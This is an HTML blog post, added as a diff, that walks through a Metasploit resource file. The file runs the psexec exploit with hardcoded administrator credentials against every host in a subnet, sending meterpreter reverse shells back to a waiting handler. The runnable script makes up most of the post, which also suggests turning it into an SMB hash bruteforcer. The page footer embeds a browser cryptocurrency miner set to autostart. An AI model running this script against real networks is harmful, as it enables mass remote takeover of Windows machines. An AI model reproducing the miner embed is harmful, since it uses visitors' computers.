@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Rapid fire PSEXEC for Metasploit &middot;  </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.41" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://malicious.link/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-198967-1', 'auto');
+	  ga('send', 'pageview');
+
+</script>
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://malicious.link/">/home/mubix</a>
+				</li>
+
+				
+				
+				<li >
+					<a href="/brandon">~/brandon</a>
+				</li>
+				
+				
+				<li >
+					<a href="/about">~/about</a>
+				</li>
+				
+				
+				<li >
+					<a href="/post">~/posts</a>
+				</li>
+				
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://malicious.link/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/">Rapid fire PSEXEC for Metasploit</a></h1>
+            <span class="post-date">Sep 12, 2010 </span>
+            <div class="post-content">
+                <p>Exploit modules inside of metasploit don&rsquo;t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It&rsquo;s really not much but there are some really juicy pieces of knowledge I learned on the way here.</p>
+
+<p>// The following is a resource file, but instead of just giving you something to download or straight copy and paste, I&rsquo;ve broken it up into sections. Also take note of the &ldquo;setg&rdquo; which sets the variable globally so that I don&rsquo;t have to set it inside of the psexec module.</p>
+
+<pre><code>use multi/handler  
+setg PAYLOAD windows/meterpreter/reverse_tcp  
+setg LHOST 192.168.1.114  
+setg LPORT 80  
+set ExitOnSession false
+
+exploit -j -z
+</code></pre>
+
+<p>This first part, while nothing spectacular, sets the multi/handler up before hand so that each run of the exploit module doesn&rsquo;t have to set up and tear down the handler. = fast. The following though is just the setup for the module.</p>
+
+<pre><code>use windows/smb/psexec  
+set SMBUser Administrator  
+set SMBPass password123
+</code></pre>
+
+<p>Here is where it gets interesting though. Windows systems want something in SMBDomain, if they aren&rsquo;t joined to a domain they can take pretty much anything here.</p>
+
+<p>However if they are actually joined to a domain, you either have to have the computer name (which definitely won&rsquo;t play well with a scanner easily) or use domain credentials.</p>
+
+<pre><code>set SMBDomain .
+</code></pre>
+
+<p>The &ldquo;.&rdquo; is something every Windows API programmer would know as it&rsquo;s really well documented, but certainly not every Metasploit user. What it means is basically localhost, since SMB won&rsquo;t take either localhost or 127.0.0.1.</p>
+
+<p>Next up, we don&rsquo;t want each run of the exploit module to build the multi/handler and tear it down every single run. That&rsquo;s why we built it first and set DisablePayloadHandler inside of the psexec module.</p>
+
+<pre><code>set DisablePayloadHandler true
+</code></pre>
+
+<p>Resource files have been able run blocks of ruby in metasploit since revision 8876. By putting the <code>&lt;ruby&gt;</code> html like block identifier you can then use the power of Ruby combined with Rex (Metasploit&rsquo;s API) to do really cool stuff.</p>
+
+<p>More setup, but this time for the ruby portion. Using Metasploit&rsquo;s RangeWalker, we can take all kinds of input, an IP, a CIDR range, and even a line separated file of IP addresses using the &ldquo;file:&rdquo; prefix.</p>
+
+<pre><code class="language-ruby">&lt;ruby&gt;  
+require 'rex/socket/range_walker'  
+rhosts = &quot;192.168.92.0/24&quot;  
+iplist = Rex::Socket::RangeWalker.new(rhosts)  
+iplist.each do |rhost|
+</code></pre>
+
+<p>So, we&rsquo;ve included RangeWalker, parsed it, and loaded it into an &lsquo;each&rsquo; for loop.</p>
+
+<p>The <code>self.run_single</code> function allows you to send commands like you were outside of the ruby block to msfconsole. We are setting the RHOST to each IP that RangeWalker parsed out, simple right?</p>
+
+<pre><code class="language-ruby">	self.run_single(&quot;set RHOST #{rhost}&quot;)  
+	self.run_single(&quot;exploit -j -z&quot;)
+end  
+&lt;/ruby&gt;
+</code></pre>
+
+<p>That&rsquo;s it, we send all of the exploit modules one at a time to the background and tell it not to interact with it using the &ldquo;-z -j&rdquo; just as we did with multi/handler.</p>
+
+<p>Now, if your credentials worked on any of the IPs you&rsquo;ll have sessions waiting for you.</p>
+
+<p>This can easily be extended with one more loop and a bit of shuffling to make this in to a SMB bruteforcer that accepts hashes!.</p>
+
+<p>Hope you learned a few things. Oh, and just a caveat, this is NOT quiet or stealthy and will probably get you caught on a blackbox pentest, but this is really great for the smash and grab style of  CTF competitions.</p>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>
+	<center>
+	<b>If you wish to support this blog, please consider clicking start for a little bit. Thanks!</b>
+	<br />
+	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+	<div class="coinhive-miner"
+	style="width: 800px; height: 80px"
+	data-key="Fq2psjl0HfUkdM4LuKrCulHymNpmFuXb"
+	data-whitelabel="true"
+	data-text="#000000"
+	data-background="#F5F5F5"
+	data-user="blog"
+	data-autostart="true"
+	>
+	<em>Loading...</em>
+	</div>
+	</center>
+</p>
+<p>Copyright &copy; 2018 Malicious.Link -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+
+</footer>
+
+    </body>
